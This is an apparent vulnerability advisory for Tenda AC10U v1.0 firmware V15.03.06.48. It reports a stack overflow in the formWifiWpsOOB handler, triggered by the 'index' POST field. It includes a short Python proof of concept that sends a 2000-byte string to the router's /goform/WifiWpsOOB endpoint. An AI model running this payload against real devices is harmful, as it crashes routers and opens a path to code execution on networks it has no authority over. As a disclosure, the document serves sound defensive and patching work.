## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware  V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formWifiWpsOOB` function. The `index` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `index` can trigger this security vulnerability.

![image-20240309195802781](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195802781.png)

![image-20240309195638707](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195638707.png)

![image-20240309195719169](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195719169.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsOOB"
payload = b"a"*2000

data = {"index": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240309195750161](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195750161.png)
